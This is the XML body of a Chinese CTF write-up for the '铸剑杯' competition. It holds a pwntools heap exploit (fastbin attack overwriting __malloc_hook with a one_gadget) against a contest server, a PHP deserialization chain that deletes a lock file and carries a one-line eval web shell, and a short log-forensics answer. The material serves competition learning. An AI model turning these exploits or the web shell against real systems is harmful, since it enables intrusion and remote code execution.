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铸剑杯wp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F5FAD" w:id="0"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:color w:val="c3cff6"/>
        </w:rPr>
        <w:t>我不吃牛肉</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="0"/>
    <w:bookmarkStart w:name="u9a89d4ac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uaf 打fastbin attck 修改malloc为ogg 通过realloc调整栈帧</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="1"/>
    <w:bookmarkStart w:name="zWZwS" w:id="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pwn import *</w:t>
        <w:br/>
        <w:t>import ctypes</w:t>
        <w:br/>
        <w:t/>
        <w:br/>
        <w:t/>
        <w:br/>
        <w:t>context(arch='amd64',os='linux')</w:t>
        <w:br/>
        <w:t>context.log_level='debug'</w:t>
        <w:br/>
        <w:t>file="./pwn"</w:t>
        <w:br/>
        <w:t>elf=ELF(file)</w:t>
        <w:br/>
        <w:t>libc=ELF('libc.so.6')</w:t>
        <w:br/>
        <w:t>DOCKER_PORT=""</w:t>
        <w:br/>
        <w:t xml:space="preserve">REMOTE_NC_CMD    = "nc 113.201.14.253 52900" </w:t>
        <w:br/>
        <w:t/>
        <w:br/>
        <w:t>def conn():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if args.LOCAL:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return process([file])</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if args.GDB:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return gdb.debug([file], gdbscript=script)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if args.DOCKER:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return remote("localhost", DOCKER_PORT)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))</w:t>
        <w:br/>
        <w:t>io=conn()</w:t>
        <w:br/>
        <w:t>s  = lambda x: io.send(x)</w:t>
        <w:br/>
        <w:t>ru =lambda x: io.recvuntil(x, drop=True)</w:t>
        <w:br/>
        <w:t>sl =lambda x: io.sendline(x)</w:t>
        <w:br/>
        <w:t>rc=lambda x:io.recv(x)</w:t>
        <w:br/>
        <w:t>sa = lambda x, y: io.sendafter(x, y)</w:t>
        <w:br/>
        <w:t>sla = lambda x, y: io.sendlineafter(x, y)</w:t>
        <w:br/>
        <w:t>ia = lambda: io.interactive()</w:t>
        <w:br/>
        <w:t/>
        <w:br/>
        <w:t/>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
        <w:br/>
        <w:t>script ="""</w:t>
        <w:br/>
        <w:t/>
        <w:br/>
        <w:t>"""</w:t>
        <w:br/>
        <w:t>def dbg():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    global script</w:t>
        <w:br/>
        <w:t xml:space="preserve">    gdb.attach(io,script)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    pause()</w:t>
        <w:br/>
        <w:t>7</w:t>
        <w:br/>
        <w:t>menu=b'choice:'</w:t>
        <w:br/>
        <w:t>def add(idx,size,content=b'aaaa'):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    io.recvuntil(menu)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    io.sendline(b'8')</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ru(b'index')</w:t>
        <w:br/>
        <w:t xml:space="preserve">    sl(str(idx).encode())</w:t>
        <w:br/>
        <w:t xml:space="preserve">    io.recvuntil(b'size:')</w:t>
        <w:br/>
        <w:t xml:space="preserve">    io.sendline(str(size).encode())</w:t>
        <w:br/>
        <w:t xml:space="preserve">    #edit(idx,content)</w:t>
        <w:br/>
        <w:t>def free(idx):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    io.recvuntil(menu)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    io.sendline(b'4')</w:t>
        <w:br/>
        <w:t xml:space="preserve">    io.recvuntil(b':')</w:t>
        <w:br/>
        <w:t xml:space="preserve">    io.sendline(str(idx).encode())</w:t>
        <w:br/>
        <w:t>def show(idx):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    io.recvuntil(menu)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    io.sendline(b'0')</w:t>
        <w:br/>
        <w:t xml:space="preserve">    io.recvuntil(b':')</w:t>
        <w:br/>
        <w:t xml:space="preserve">    io.sendline(str(idx).encode())</w:t>
        <w:br/>
        <w:t>def edit(idx,content=b'aaaa'):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    io.recvuntil(menu)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    io.sendline(b'2')</w:t>
        <w:br/>
        <w:t xml:space="preserve">    io.recvuntil(b':')</w:t>
        <w:br/>
        <w:t xml:space="preserve">    io.sendline(str(idx).encode())</w:t>
        <w:br/>
        <w:t xml:space="preserve">    io.recvuntil(b'length:')</w:t>
        <w:br/>
        <w:t xml:space="preserve">    io.sendline(str(len(content)).encode())</w:t>
        <w:br/>
        <w:t xml:space="preserve">    io.recvuntil(b':')</w:t>
        <w:br/>
        <w:t xml:space="preserve">    io.sendline(content)</w:t>
        <w:br/>
        <w:t>add(2, 0x100, '2')</w:t>
        <w:br/>
        <w:t>add(3, 0x10, 'protect')</w:t>
        <w:br/>
        <w:t>free(2)</w:t>
        <w:br/>
        <w:t>add(2, 0x30, 'aaaaaaaa')</w:t>
        <w:br/>
        <w:t>show(2)</w:t>
        <w:br/>
        <w:t>#dbg()</w:t>
        <w:br/>
        <w:t>io.recvline()</w:t>
        <w:br/>
        <w:t>addr=u64(io.recv(6).ljust(8, b'\x00'))-0x4b78-0x3c0100</w:t>
        <w:br/>
        <w:t>print("libc:",hex(addr))</w:t>
        <w:br/>
        <w:t>libc.address=addr</w:t>
        <w:br/>
        <w:t>__malloc_hook = libc.sym['__malloc_hook']</w:t>
        <w:br/>
        <w:t>print("malloc_hook:",hex(__malloc_hook))</w:t>
        <w:br/>
        <w:t>add(0, 0x60, 'aaaa')</w:t>
        <w:br/>
        <w:t>free(0)</w:t>
        <w:br/>
        <w:t>edit(0,     p64(__malloc_hook - 0x23))</w:t>
        <w:br/>
        <w:t>realloc=libc.sym['realloc']</w:t>
        <w:br/>
        <w:t>add(0, 0x60, 'aaaa')</w:t>
        <w:br/>
        <w:t>free(0)</w:t>
        <w:br/>
        <w:t>edit(0, p64(__malloc_hook - 0x23))</w:t>
        <w:br/>
        <w:t>add(1,0x60,'a')</w:t>
        <w:br/>
        <w:t>og = addr+[0x4527a,0xf03a4,0xf1247][0]</w:t>
        <w:br/>
        <w:t>add(2,0x60)</w:t>
        <w:br/>
        <w:t>print(hex(realloc))</w:t>
        <w:br/>
        <w:t>edit(2,b'a'*0xb + p64(og)+p64(realloc+4))</w:t>
        <w:br/>
        <w:t/>
        <w:br/>
        <w:t>print(hex(og))</w:t>
        <w:br/>
        <w:t/>
        <w:br/>
        <w:t>#dbg()</w:t>
        <w:br/>
        <w:t>add(0,0x10)</w:t>
        <w:br/>
        <w:t/>
        <w:br/>
        <w:t/>
        <w:br/>
        <w:t>ia()</w:t>
        <w:br/>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="2"/>
    <w:bookmarkStart w:name="u826e621c" w:id="3"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:name="u5be51fbc" w:id="4"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="宋体" w:ascii="宋体"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="5266266" cy="38336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38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f3cc0766" w:id="5"/>
    <w:bookmarkEnd w:id="5"/>
    <w:bookmarkStart w:name="ud7408c74" w:id="6"/>
    <w:bookmarkEnd w:id="6"/>
    <w:bookmarkStart w:name="u98a3ec04" w:id="7"/>
    <w:bookmarkEnd w:id="7"/>
    <w:bookmarkStart w:name="u7e74bcba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web php</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="8"/>
    <w:bookmarkStart w:name="u3cc23ad2" w:id="9"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:name="u8c21e87e" w:id="10"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="宋体" w:ascii="宋体"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="5842000" cy="25938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67067" cy="518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9"/>
    <w:bookmarkStart w:name="u3c9c933d" w:id="11"/>
    <w:bookmarkEnd w:id="11"/>
    <w:bookmarkStart w:name="u6ff585e7" w:id="12"/>
    <w:bookmarkEnd w:id="12"/>
    <w:bookmarkStart w:name="u08e66ef6" w:id="13"/>
    <w:bookmarkEnd w:id="13"/>
    <w:bookmarkStart w:name="qJvRh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/>
        <w:br/>
        <w:t>&lt;?php</w:t>
        <w:br/>
        <w:t>class install {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    public $username;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    public $password;</w:t>
        <w:br/>
        <w:t/>
        <w:br/>
        <w:t xml:space="preserve">    public function __wakeup()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        echo "Hello,".$this-&gt;username;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
        <w:br/>
        <w:t/>
        <w:br/>
        <w:t xml:space="preserve">    public function __toString()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    {</w:t>
        <w:br/>
        <w:t xml:space="preserve">       </w:t>
        <w:br/>
        <w:t xml:space="preserve">        ($this-&gt;username)();</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return "Guest";</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
        <w:br/>
        <w:t/>
        <w:br/>
        <w:t xml:space="preserve">    public function __destruct()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        if(file_exists("install.lock")){</w:t>
        <w:br/>
        <w:t xml:space="preserve">            exit("Already installed");</w:t>
        <w:br/>
        <w:t xml:space="preserve">        }else{</w:t>
        <w:br/>
        <w:t xml:space="preserve">            $config = [</w:t>
        <w:br/>
        <w:t xml:space="preserve">                'username' =&gt; $this-&gt;username,</w:t>
        <w:br/>
        <w:t xml:space="preserve">                'password' =&gt; md5($this-&gt;password)</w:t>
        <w:br/>
        <w:t xml:space="preserve">            ];</w:t>
        <w:br/>
        <w:t xml:space="preserve">            file_put_contents('config.php', serialize($config));</w:t>
        <w:br/>
        <w:t xml:space="preserve">            file_put_contents('install.lock', "ok");</w:t>
        <w:br/>
        <w:t xml:space="preserve">        }</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
        <w:br/>
        <w:t>}</w:t>
        <w:br/>
        <w:t>class Until {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    public $a;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    public $b;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    public $c;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    public $d;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    public function __invoke()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        $this-&gt;write($this-&gt;a, $this-&gt;b, $this-&gt;c);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
        <w:br/>
        <w:t/>
        <w:br/>
        <w:t xml:space="preserve">    public function __toString()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return "HappyUnserialize";</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
        <w:br/>
        <w:t/>
        <w:br/>
        <w:t xml:space="preserve">    public function write($cla, $file, $cont)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        $obj = new $cla();</w:t>
        <w:br/>
        <w:t xml:space="preserve">        $obj-&gt;open($file,$cont);</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return True;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
        <w:br/>
        <w:t>}</w:t>
        <w:br/>
        <w:t>$b = new Until();</w:t>
        <w:br/>
        <w:t>$c = new install();;</w:t>
        <w:br/>
        <w:t>$b-&gt;a = "ZipArchive";</w:t>
        <w:br/>
        <w:t>$b-&gt;b = "install.lock";</w:t>
        <w:br/>
        <w:t>$b-&gt;d = "&lt;?php eval(\$_POST[1]);?&gt;";</w:t>
        <w:br/>
        <w:t>$b-&gt;c = ZipArchive::OVERWRITE;</w:t>
        <w:br/>
        <w:t>$a = new install();</w:t>
        <w:br/>
        <w:t/>
        <w:br/>
        <w:t>$c-&gt;username = $b;</w:t>
        <w:br/>
        <w:t>$a-&gt;username = $c;</w:t>
        <w:br/>
        <w:t>$a-&gt;password = $c;</w:t>
        <w:br/>
        <w:t/>
        <w:br/>
        <w:t>echo serialize($a);</w:t>
        <w:br/>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="14"/>
    <w:bookmarkStart w:name="u45c5a64b" w:id="15"/>
    <w:bookmarkEnd w:id="15"/>
    <w:bookmarkStart w:name="GvUxF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c3cff6"/>
        </w:rPr>
        <w:t>可恶的木马竟然伪装成我的朋友</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="16"/>
    <w:bookmarkStart w:name="u65bf389d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过滤：cat * |grep banner_home.jpg</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="17"/>
    <w:bookmarkStart w:name="ud47e2f8f" w:id="18"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:name="u4f3eea9b" w:id="19"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="宋体" w:ascii="宋体"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="5842000" cy="13845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22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bookmarkStart w:name="u44698811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找到 183.62.9.42为附近常见的ip，然后</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="20"/>
    <w:bookmarkStart w:name="ubf2a29a7" w:id="21"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:name="hheRs" w:id="22"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="宋体" w:ascii="宋体"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="5842000" cy="11625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43066" cy="201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bookmarkStart w:name="u5e75696d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检索上传的恶意文件：table.jsp-en.jsp-2.jsp</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="23"/>
    <w:bookmarkStart w:name="u7b5df0f8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得到flag：flag{2018-2-23/183.62.9.42/table.jsp-en.jsp-2.jsp}</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="24"/>
    <w:bookmarkStart w:name="ubd438659" w:id="25"/>
    <w:bookmarkEnd w:id="2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